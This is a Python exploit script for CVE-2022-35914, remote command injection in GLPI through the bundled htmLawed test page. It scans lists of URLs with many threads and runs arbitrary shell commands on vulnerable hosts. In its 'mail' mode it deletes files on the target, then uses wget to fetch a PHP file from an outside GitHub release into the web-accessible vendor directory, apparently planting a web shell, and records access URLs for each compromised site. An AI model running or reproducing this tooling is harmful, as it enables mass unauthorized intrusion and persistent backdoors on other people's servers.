#!/usr/bin/python
# -*- coding: utf-8 -*-

import argparse
from bs4 import BeautifulSoup
import requests
import sys
import re
import os
from urllib.parse import urljoin, urlparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

requests.packages.urllib3.disable_warnings() 

RED = '\x1b[91m'
BLUE = '\033[94m'
GREEN = '\033[32m'
YELLOW = '\033[93m'
ENDC = '\033[0m'

banner="""  
  ______     _______     ____   ___ ____  ____      _________  ___  _ _  _   
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ / ___|/ _ \/ | || |  
| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \___ \ (_) | | || |_ 
| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) |__) \__, | |__   _|
 \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/____/  /_/|_|  |_|  
"""

def main():
    print(banner)
    parser = argparse.ArgumentParser(description='CVE-2022-35914 - GLPI - Command injection using a third-party library script (Enhanced Version)')
    
    # 原有参数
    parser.add_argument('-u', type=str, dest='url', help="单个URL测试")
    parser.add_argument('-c', type=str, dest='cmd', default="id", help="要执行的命令 (默认: id)")
    parser.add_argument('-f', type=str, dest='hook', default="exec", help="PHP hook函数 (默认: exec)")
    parser.add_argument('--check', action="store_true", dest='check', help="仅检查漏洞，不执行命令")
    parser.add_argument('--user-agent', type=str, default="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36", dest='user_agent', help="自定义User-Agent")
    
    # 新增参数
    parser.add_argument('-l', type=str, dest='url_file', help="批量检测URL文件路径")
    parser.add_argument('-m', type=str, dest='target_url', help="对指定URL执行mail检测和下载操作")
    parser.add_argument('-lm', type=str, dest='batch_mail_file', help="批量执行mail检测和下载操作")
    parser.add_argument('-o', type=str, dest='output_file', help="输出结果到指定文件")
    parser.add_argument('-t', type=int, dest='threads', default=10, help="多线程数量 (默认: 10)")
    
    args = parser.parse_args()
    
    # 参数验证
    if not any([args.url, args.url_file, args.target_url, args.batch_mail_file]):
        parser.error("必须指定以下参数之一: -u, -l, -m, -lm")
    
    # 执行相应功能
    if args.batch_mail_file:
        batch_mail_operation(args.batch_mail_file, args.output_file, args.user_agent, args.threads)
    elif args.target_url:
        mail_operation(args.target_url, args.output_file, args.user_agent)
    elif args.url_file:
        batch_check(args.url_file, args.output_file, args.user_agent, args.threads)
    elif args.url:
        exploit(args.url, args.cmd, args.user_agent, args.check, args.hook)

def batch_check(url_file, output_file, user_agent, threads=10):
    """批量检测URL文件中的链接是否存在漏洞"""
    print(f"{BLUE}[*] 开始批量检测漏洞...{ENDC}")
    print(f"{BLUE}[*] 使用 {threads} 个线程{ENDC}")
    
    if not os.path.exists(url_file):
        print(f"{RED}[-] 文件不存在: {url_file}{ENDC}")
        return
    
    vulnerable_urls = []
    lock = threading.Lock()
    
    try:
        with open(url_file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
        
        # 去重处理
        original_count = len(urls)
        urls = deduplicate_urls(urls)
        deduplicated_count = len(urls)
        
        if original_count != deduplicated_count:
            print(f"{YELLOW}[*] 去重前: {original_count} 个URL，去重后: {deduplicated_count} 个URL{ENDC}")
        
        print(f"{BLUE}[*] 共发现 {len(urls)} 个URL需要检测{ENDC}")
        
        def check_single_url(url):
            """检查单个URL的线程函数"""
            try:
                if check_vulnerability(url, user_agent):
                    with lock:
                        vulnerable_urls.append(url)
                        print(f"{GREEN}[+] 发现漏洞: {url}{ENDC}")
                else:
                    print(f"{RED}[-] 无漏洞: {url}{ENDC}")
            except Exception as e:
                print(f"{RED}[-] 检测 {url} 时出错: {str(e)}{ENDC}")
        
        # 使用线程池执行检测
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(check_single_url, url) for url in urls]
            
            # 等待所有任务完成
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{RED}[-] 线程执行出错: {str(e)}{ENDC}")
        
        # 输出结果
        print(f"\n{BLUE}[*] 检测完成! 发现 {len(vulnerable_urls)} 个存在漏洞的URL{ENDC}")
        
        if vulnerable_urls:
            print(f"{GREEN}[+] 存在漏洞的URL列表:{ENDC}")
            for url in vulnerable_urls:
                print(f"  - {url}")
            
            # 保存到文件
            if output_file:
                save_results_to_file(vulnerable_urls, output_file, "vulnerable_urls")
        
    except Exception as e:
        print(f"{RED}[-] 批量检测出错: {str(e)}{ENDC}")

def mail_operation(target_url, output_file, user_agent):
    """对指定URL执行mail检测和下载操作"""
    print(f"{BLUE}[*] 开始对 {target_url} 执行mail操作...{ENDC}")
    
    # 首先检查漏洞
    if not check_vulnerability(target_url, user_agent):
        print(f"{RED}[-] 目标URL不存在漏洞，无法执行操作{ENDC}")
        return
    
    print(f"{GREEN}[+] 目标存在漏洞，开始执行命令...{ENDC}")
    
    # 执行ls命令检查mail目录
    cmd = "ls ~"
    result = execute_command(target_url, cmd, user_agent)
    
    if result and "mail" in result.lower():
        print(f"{GREEN}[+] 发现mail目录，开始下载mail_system.php...{ENDC}")
        
        # 先删除现有的mail_system.php文件（如果存在）
        delete_cmd = "rm -f mail_system.php"
        print(f"{YELLOW}[*] 删除现有mail_system.php文件...{ENDC}")
        delete_result = execute_command(target_url, delete_cmd, user_agent)
        
        # 等待0.5秒确保删除操作完成
        print(f"{YELLOW}[*] 等待0.5秒确保删除操作完成...{ENDC}")
        time.sleep(0.5)
        
        # 验证文件是否已删除
        check_cmd = "ls -la mail_system.php 2>/dev/null || echo 'file_not_found'"
        check_result = execute_command(target_url, check_cmd, user_agent)
        
        if check_result and "file_not_found" in check_result:
            print(f"{GREEN}[+] 文件删除成功{ENDC}")
        else:
            print(f"{YELLOW}[*] 文件可能仍存在，继续执行下载...{ENDC}")
        
        # 下载mail_system.php
        download_cmd = "wget -q https://github.com/atomicjjbod/kali_script/releases/download/v2.0/mail_system.php"
        print(f"{YELLOW}[*] 开始下载mail_system.php...{ENDC}")
        download_result = execute_command(target_url, download_cmd, user_agent)
        
        # 验证下载是否成功
        verify_cmd = "ls -la mail_system.php 2>/dev/null && echo 'download_success' || echo 'download_failed'"
        verify_result = execute_command(target_url, verify_cmd, user_agent)
        
        if verify_result and "download_success" in verify_result:
            print(f"{GREEN}[+] 文件下载成功{ENDC}")
        else:
            print(f"{RED}[-] 文件下载可能失败，请手动检查{ENDC}")
        
        # 构造访问URL
        access_url = f"{target_url}/vendor/htmlawed/htmlawed/mail_system.php"
        print(f"{GREEN}[+] 访问地址: {access_url}{ENDC}")
        
        # 保存结果
        results = {
            "target_url": target_url,
            "access_url": access_url,
            "download_result": "下载命令已执行（wget通常无回显）"
        }
        
        if output_file:
            save_mail_results_to_file(results, output_file)
        
        return access_url
    else:
        print(f"{RED}[-] 未发现mail目录{ENDC}")

def batch_mail_operation(url_file, output_file, user_agent, threads=10):
    """批量执行mail检测和下载操作"""
    print(f"{BLUE}[*] 开始批量mail操作...{ENDC}")
    print(f"{BLUE}[*] 使用 {threads} 个线程{ENDC}")
    
    if not os.path.exists(url_file):
        print(f"{RED}[-] 文件不存在: {url_file}{ENDC}")
        return
    
    successful_urls = []
    lock = threading.Lock()
    
    try:
        with open(url_file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
        
        # 去重处理
        original_count = len(urls)
        urls = deduplicate_urls(urls)
        deduplicated_count = len(urls)
        
        if original_count != deduplicated_count:
            print(f"{YELLOW}[*] 去重前: {original_count} 个URL，去重后: {deduplicated_count} 个URL{ENDC}")
        
        print(f"{BLUE}[*] 共发现 {len(urls)} 个URL需要处理{ENDC}")
        
        def process_single_url(url):
            """处理单个URL的线程函数"""
            try:
                print(f"{YELLOW}[*] 处理: {url}{ENDC}")
                access_url = mail_operation(url, None, user_agent)
                if access_url:
                    with lock:
                        successful_urls.append({
                            "target_url": url,
                            "access_url": access_url
                        })
                        print(f"{GREEN}[+] 成功处理: {url}{ENDC}")
                else:
                    print(f"{RED}[-] 处理失败: {url}{ENDC}")
            except Exception as e:
                print(f"{RED}[-] 处理 {url} 时出错: {str(e)}{ENDC}")
        
        # 使用线程池执行处理
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(process_single_url, url) for url in urls]
            
            # 等待所有任务完成
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{RED}[-] 线程执行出错: {str(e)}{ENDC}")
        
        # 输出总结
        print(f"\n{BLUE}[*] 批量操作完成! 成功处理 {len(successful_urls)} 个URL{ENDC}")
        
        if successful_urls:
            print(f"{GREEN}[+] 成功处理的URL列表:{ENDC}")
            for item in successful_urls:
                print(f"  目标: {item['target_url']}")
                print(f"  访问: {item['access_url']}")
                print()
            
            # 保存到文件
            if output_file:
                save_batch_mail_results_to_file(successful_urls, output_file)
        
    except Exception as e:
        print(f"{RED}[-] 批量mail操作出错: {str(e)}{ENDC}")

def check_vulnerability(url, user_agent):
    """检查单个URL是否存在漏洞"""
    try:
        uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"
        headers = {'User-Agent': user_agent}
        
        session = requests.Session()
        response = session.get(url + uri, verify=False, headers=headers, timeout=10)
        
        if response.status_code != 200:
            return False
        
        soup = BeautifulSoup(response.text, 'html.parser')
        if soup.title and soup.title.text.find("htmLawed") == -1:
            return False
        
        return True
        
    except Exception as e:
        print(f"{RED}[-] 检查 {url} 时出错: {str(e)}{ENDC}")
        return False

def execute_command(url, cmd, user_agent):
    """执行命令并返回结果"""
    try:
        uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"
        headers = {'User-Agent': user_agent}
        
        session = requests.Session()
        response_part1 = session.get(url + uri, verify=False, headers=headers, timeout=10)
        
        if response_part1.status_code != 200:
            return None
        
        soup = BeautifulSoup(response_part1.text, 'html.parser')
        if not soup.title or soup.title.text.find("htmLawed") == -1:
            return None
        
        # 准备POST请求
        token_element = soup.find_all(id='token')
        if not token_element:
            return None
            
        token_value = token_element[0]['value']
        sid_value = session.cookies.get("sid")
        body = {"token": token_value, "text": cmd, "hhook": "exec", "sid": sid_value}
        
        response_part2 = session.post(url + uri, verify=False, headers=headers, data=body, timeout=10)
        return parse_command_output(response_part2.text)
        
    except Exception as e:
        print(f"{RED}[-] 执行命令时出错: {str(e)}{ENDC}")
        return None

def parse_command_output(response):
    """解析命令输出"""
    try:
        soup = BeautifulSoup(response, 'html.parser')
        raw = soup.find_all(id='settingF')
        
        if not raw:
            return None
        
        raw = raw[0]
        
        output_search_regex = r"\[xml:lang\] \=\> 0\n(.*)\n\)"
        found_output = re.search(output_search_regex, raw.text, re.DOTALL)
        
        if found_output:
            raw_output = found_output.group(1)
            cleaning_regex = r".*\=\>"
            cleaned_output = re.sub(cleaning_regex, "", raw_output)
            return cleaned_output.strip()
        
        return None
        
    except Exception as e:
        print(f"{RED}[-] 解析命令输出时出错: {str(e)}{ENDC}")
        return None

def save_results_to_file(results, filename, result_type):
    """保存结果到文件"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"# {result_type.upper()} 检测结果\n")
            f.write(f"# 检测时间: {get_current_time()}\n\n")
            
            for result in results:
                f.write(f"{result}\n")
        
        print(f"{GREEN}[+] 结果已保存到: {filename}{ENDC}")
        
    except Exception as e:
        print(f"{RED}[-] 保存文件时出错: {str(e)}{ENDC}")

def save_mail_results_to_file(results, filename):
    """保存mail操作结果到文件"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("# MAIL操作结果\n")
            f.write(f"# 操作时间: {get_current_time()}\n\n")
            f.write(f"目标URL: {results['target_url']}\n")
            f.write(f"访问地址: {results['access_url']}\n")
            f.write(f"下载结果: {results['download_result']}\n")
        
        print(f"{GREEN}[+] Mail操作结果已保存到: {filename}{ENDC}")
        
    except Exception as e:
        print(f"{RED}[-] 保存文件时出错: {str(e)}{ENDC}")

def save_batch_mail_results_to_file(results, filename):
    """保存批量mail操作结果到文件"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("# 批量MAIL操作结果\n")
            f.write(f"# 操作时间: {get_current_time()}\n")
            f.write(f"# 成功处理数量: {len(results)}\n\n")
            
            for i, result in enumerate(results, 1):
                f.write(f"## 第{i}个目标\n")
                f.write(f"目标URL: {result['target_url']}\n")
                f.write(f"访问地址: {result['access_url']}\n\n")
        
        print(f"{GREEN}[+] 批量Mail操作结果已保存到: {filename}{ENDC}")
        
    except Exception as e:
        print(f"{RED}[-] 保存文件时出错: {str(e)}{ENDC}")

def get_current_time():
    """获取当前时间字符串"""
    from datetime import datetime
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def deduplicate_urls(urls):
    """URL去重功能，去除重复的主域名"""
    domain_url_map = {}
    
    for url in urls:
        if not url.strip():
            continue
            
        try:
            # 解析URL获取域名
            parsed = urlparse(url)
            domain = parsed.netloc.lower()
            
            # 去除www前缀进行比较
            if domain.startswith('www.'):
                clean_domain = domain[4:]
            else:
                clean_domain = domain
            
            # 如果这个域名还没有记录，或者当前URL更短（优先选择不带www的版本）
            if clean_domain not in domain_url_map:
                domain_url_map[clean_domain] = url
            else:
                # 如果当前URL不带www，优先选择它
                current_url = domain_url_map[clean_domain]
                if not domain.startswith('www.') and current_url.startswith('www.'):
                    domain_url_map[clean_domain] = url
                # 如果当前URL更短，也选择它
                elif len(url) < len(current_url):
                    domain_url_map[clean_domain] = url
                    
        except Exception as e:
            print(f"{YELLOW}[*] 解析URL时出错，跳过: {url} - {str(e)}{ENDC}")
            continue
    
    return list(domain_url_map.values())

def exploit(url, cmd, user_agent, check, hook):
    """原有的exploit功能"""
    uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"
    headers = {'User-Agent': user_agent}

    session = requests.Session()
    response_part1 = session.get(str(url)+uri, verify=False, headers=headers)
    if (response_part1.status_code != 200):
        fail()
    
    soup = BeautifulSoup(response_part1.text, 'html.parser')
    if (soup.title.text.find("htmLawed") == -1):
        fail()

    if (check):
        print(GREEN + "[+] Server potentially vulnerable to CVE-2022-35914" + ENDC)
        sys.exit()

    # Prepare POST request
    token_value = soup.find_all(id='token')[0]['value']
    sid_value = session.cookies.get("sid")
    body = {"token":token_value,"text":cmd,"hhook":hook,"sid":sid_value}
    response_part2 = session.post(str(url)+uri, verify=False, headers=headers, data=body)
    parse(response_part2.text)

def parse(response):
    """原有的parse功能"""
    soup = BeautifulSoup(response, 'html.parser')
    raw = soup.find_all(id='settingF')[0]

    return_code_search_regex = "\$spec\: (.*)"
    found_return_code = re.search(return_code_search_regex, raw.text, re.DOTALL).group(1)

    output_search_regex = "\[xml:lang\] \=\> 0\n(.*)\n\)"
    found_output = re.search(output_search_regex, raw.text, re.DOTALL)
    print(GREEN + "[+] Command output (Return code: " + found_return_code + "):" + ENDC)
    if (found_output != None):
        raw_output = found_output.group(1)
        cleaning_regex = ".*\=\>"
        cleaned_output = re.sub (cleaning_regex, "", raw_output)
        print(cleaned_output)

def fail():
    """原有的fail功能"""
    print(RED + "[-] Server not vulnerable to CVE-2022-35914" + ENDC)
    sys.exit()

if __name__ == '__main__':
    main()
